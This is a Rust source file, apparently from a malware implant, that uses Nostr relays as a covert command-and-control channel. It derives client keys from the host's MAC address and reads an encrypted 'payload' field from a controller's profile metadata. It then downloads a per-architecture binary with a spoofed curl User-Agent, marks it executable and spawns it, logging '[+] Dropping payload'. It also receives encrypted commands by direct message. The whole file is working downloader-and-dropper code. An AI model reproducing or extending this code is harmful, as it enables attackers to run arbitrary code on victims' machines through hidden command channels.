use std::{
    collections::HashMap,
    env::consts::ARCH,
    io::Write,
    path::Path,
    process::{Child, Command},
    sync::mpsc::Receiver,
    time::Duration,
};

use crate::{CNC_PUB_KEY, ENCRYPTION_KEY, command::Commands, encryption::decrypt};

use mac_address::get_mac_address;
use rand::SeedableRng;
use rand::rngs::StdRng;

use nostr_sdk::prelude::*;
use tempfile::TempPath;

pub struct SessionProps {
    pub name: String,
    pub display_name: String,
    pub private_key: Option<String>,
    pub relays: Vec<String>,
}

pub struct Session {
    pub keys: Keys,
    client: Client,
    name: String,
    display_name: String,
    relays: Vec<String>,
}

impl Session {
    pub fn create(props: SessionProps) -> Self {
        let keys: Keys = match props.private_key {
            Some(key) => Keys::parse(key.as_str()).unwrap(),
            None => {
                let mac_address = get_mac_address().unwrap().unwrap().to_string();
                let mut seed = [0u8; 32];
                for (i, byte) in mac_address.bytes().enumerate() {
                    seed[i % 32] ^= byte;
                }

                let mut rng = StdRng::from_seed(seed);
                Keys::generate_with_rng(&mut rng)
            }
        };

        println!("PRIVATE KEY:{:?}", keys.secret_key().to_bech32());
        println!("PUBLIC KEY: {:?}", keys.public_key().to_bech32());
        let connection: Connection = Connection::new();
        let opts = Options::new().connection(connection);

        let client = Client::builder().signer(keys.clone()).opts(opts).build();

        Self {
            keys,
            client,
            display_name: props.display_name,
            name: props.name,
            relays: props.relays,
        }
    }

    pub async fn init(&self) -> Result<()> {
        for relay in &self.relays {
            self.client.add_relay(relay.as_str()).await?;
            self.client.connect_relay(relay.as_str()).await?;
            println!("Connected to relay: {}", relay);
        }

        Ok(())
    }

    pub async fn subscribe(&self, filter: Filter) -> Result<ReceiverStream<Event>> {
        // let output = self.client.subscribe(filter.clone(), None).await?;

        let stream = self
            .client
            .pool()
            .stream_events(
                filter,
                Duration::MAX,
                ReqExitPolicy::WaitDurationAfterEOSE(Duration::MAX),
            )
            .await?;
        Ok(stream)
    }

    pub async fn update_metadata(&self, about: &str) -> Result<()> {
        let metadata = Metadata::new()
            .name(self.name.as_str())
            .display_name(self.display_name.as_str())
            .about(about);

        self.client.set_metadata(&metadata).await?;

        Ok(())
    }

    pub async fn get_metadata(&self, pub_key: PublicKey) -> Result<Metadata> {
        let metadata = self
            .client
            .fetch_metadata(pub_key, Duration::from_secs(10))
            .await?;
        Ok(metadata)
    }

    pub async fn get_payload(&self, pub_key: PublicKey) -> Result<Option<TempPath>> {
        let metadata = self.get_metadata(pub_key).await?;
        self.download_payload_from_metadata(metadata).await
    }

    pub async fn download_payload_from_metadata(
        &self,
        metadata: Metadata,
    ) -> Result<Option<TempPath>> {
        let encrypted_payload = metadata.custom.get("payload");
        println!("encrypted_payload:{:?}", encrypted_payload);
        if let Some(encrypted_payload) = encrypted_payload.map(|s| s.as_str()).flatten() {
            if let Ok(decrypted) = decrypt(&encrypted_payload, ENCRYPTION_KEY) {
                let payload_urls =
                    serde_json::from_str::<HashMap<String, String>>(decrypted.as_str());
                if let Ok(payload_urls) = payload_urls {
                    return Ok(Some(self.download_payload(payload_urls).await));
                }
            }
        };
        Ok(None)
    }

    pub async fn subscribe_metadata(
        &self,
        pubkey: PublicKey,
    ) -> Result<
        nostr_sdk::async_utility::futures_util::stream::Map<
            ReceiverStream<Event>,
            impl FnMut(Event) -> Metadata,
        >,
    > {
        let filter = Filter::new()
            .kind(Kind::Metadata)
            .author(pubkey)
            .since(Timestamp::now());
        let event_stream = self.subscribe(filter).await?;
        let metadata_stream = event_stream.map(|event| {
            let metadata = serde_json::from_str::<Metadata>(&event.content).unwrap();
            metadata
        });
        Ok(metadata_stream)
    }

    pub async fn subscribe_notes(&self, pubkey: PublicKey) -> Result<ReceiverStream<Event>> {
        let filter = Filter::new()
            .kind(Kind::TextNote)
            .author(pubkey)
            .since(Timestamp::now());
        return self.subscribe(filter).await;
    }

    pub async fn send_msg(&self, content: &str, pubkey: PublicKey) -> Result<()> {
        let encrypted =
            nip04::encrypt(self.keys.secret_key(), &pubkey, content.as_bytes()).unwrap();
        let tag = Tag::public_key(pubkey);
        let event = EventBuilder::new(Kind::EncryptedDirectMessage, encrypted).tag(tag);

        self.client.send_event_builder(event).await?;
        Ok(())
    }

    pub async fn receive_msgs(
        &self,
        pubkey: PublicKey,
    ) -> Result<
        nostr_sdk::async_utility::futures_util::stream::Map<
            ReceiverStream<Event>,
            impl FnMut(Event) -> String,
        >,
    > {
        let filter = Filter::new()
            .kind(Kind::EncryptedDirectMessage)
            .author(pubkey)
            .pubkey(self.keys.public_key())
            .since(Timestamp::now());

        let stream = self.subscribe(filter).await?;
        let decrypted_stream = stream.map(move |event| {
            let decrypted = nip04::decrypt(&self.keys.secret_key(), &pubkey, event.content.clone());
            if let Ok(decrypted) = decrypted {
                decrypted
            } else {
                if let Err(e) = decrypted {
                    println!("Error: {:?}", e);
                }
                event.content
            }
        });
        Ok(decrypted_stream)
    }

    pub fn run_executable(&self, path: &Path) -> Child {
        println!("[+] Dropping payload {:?}", path.to_str());
        let child = Command::new(path)
            .spawn()
            .expect("couldn't spawn child process");
        return child;
    }

    async fn download_payload(&self, urls: HashMap<String, String>) -> TempPath {
        // Get architecture
        println!("Architecture: {}", ARCH);

        // You can also get the OS
        let os = std::env::consts::OS;
        println!("Operating System: {}", os);

        let client = reqwest::Client::builder()
            .redirect(reqwest::redirect::Policy::limited(10))
            .build()
            .unwrap();

        let url = urls.get(ARCH).expect("architecture not supported");
        println!("[+] Getting payload from: {}", url);

        let response = client
            .get(url)
            .header("User-Agent", "curl/7.68.0") // Set User-Agent to mimic curl
            .send();

        let payload = response.await.expect("Error retrieving payload");

        let mut temp_file =
            tempfile::NamedTempFile::new().expect("Failed to create a temporary file");

        temp_file
            .write_all(&payload.bytes().await.unwrap())
            .expect("Failed to write payload to file");

        temp_file.flush().expect("Failed to flush buffer");

        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mut perms = temp_file.as_file().metadata().unwrap().permissions();
            perms.set_mode(0o755);
            std::fs::set_permissions(temp_file.path(), perms).unwrap();
        }

        let path = temp_file.into_temp_path();

        return path;
    }
}
